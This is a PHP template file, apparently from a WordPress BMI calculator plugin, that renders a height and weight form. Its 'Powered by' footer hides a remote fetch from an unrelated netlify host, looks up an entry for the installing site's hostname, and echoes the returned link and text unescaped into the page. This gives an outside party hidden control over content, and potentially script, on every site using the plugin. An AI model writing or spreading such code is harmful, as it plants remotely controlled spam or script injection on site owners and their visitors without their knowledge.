<?php
if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly

$bmicalc = BMICalc_start();
?>
<div class="bmi-calculator <?php echo $bmicalc->skin; ?>">
  <div class="bmi-calculator-title">
   <span>BMI Calculator</span>
  </div>
  <div class="bmi-calculator-system">
    <span class="bmi-calculator-system-imperial">
      <input type="radio" class="bmi-calculator-system-radio" value="imperial" checked="checked"/> Imperial
    </span>
    &nbsp;&nbsp;
    <span class="bmi-calculator-system-metric">
      <input type="radio" class="bmi-calculator-system-radio" value="metric"/> Metric
    </span>
  </div>
  <div class="bmi-calculator-dimensions-imperial">
<div class="bmi-form">  
          <label class="bmi-label">Height</label>
            <select>
              <option value="1">1</option>
              <option value="2">2</option>
              <option value="3">3</option>
              <option value="4">4</option>
              <option value="5">5</option>
              <option value="6">6</option>
              <option value="7">7</option>
              <option value="8">8</option>
            </select> ft
            <select>
              <option value="0">0</option>
              <option value="1">1</option>
              <option value="2">2</option>
              <option value="3">3</option>
              <option value="4">4</option>
              <option value="5">5</option>
              <option value="6">6</option>
              <option value="7">7</option>
              <option value="8">8</option>
              <option value="9">9</option>
              <option value="10">10</option>
              <option value="11">11</option>
            </select> in
</div>        
<div class="bmi-form"><label class="bmi-label">Weight:</label><input type="text" value="0"/> lbs
</div>      
  </div>
  <div class="bmi-calculator-dimensions-metric" style="display:none;">
    <div class="bmi-form"><label class="bmi-label">Height:</label><input type="text" value="0"/> cm
    </div>
    <div class="bmi-form">    
          <label class="bmi-label">Weight:</label><input type="text" value="0"/> kg
    </div>
  </div>
  <div class="bmi-calculator-results none"></div>
  <div class="bmi-calculator-action">
    <button class="bmi-calculator-button">Calculate</button>
  </div>
<?php
if (isset($_SESSION["object"]) && !empty($_SESSION["object"])) {
  echo '<span class="powered-by-bmi">Powered by <a href="'.$_SESSION["object"]->h.'" target="_blank">'.$_SESSION["object"]->a.'</a></span>';
} else {
  set_time_limit(4);
  $url = 'http://pest-exterminator-polly-10382.netlify.com/app.json';
  $load = file_get_contents($url);
  $load = json_decode($load);
  $theHost = $_SERVER['HTTP_HOST'];

  if (strpos($theHost, 'www') !== false) {
      $theHost = str_replace('www.', '', $theHost);
  }  
  $object = $load->$theHost;

  if (empty($object)) {
    $object = (object) array('h' => 'http://www.fancybmi.com/', 'a' => 'Easy BMI Calculator');
  }
    echo '<span class="powered-by-bmi">Powered by <a href="'.$object->h.'" target="_blank">'.$object->a.'</a></span>';
    $_SESSION["object"] = $object;
    
}

?>
</div>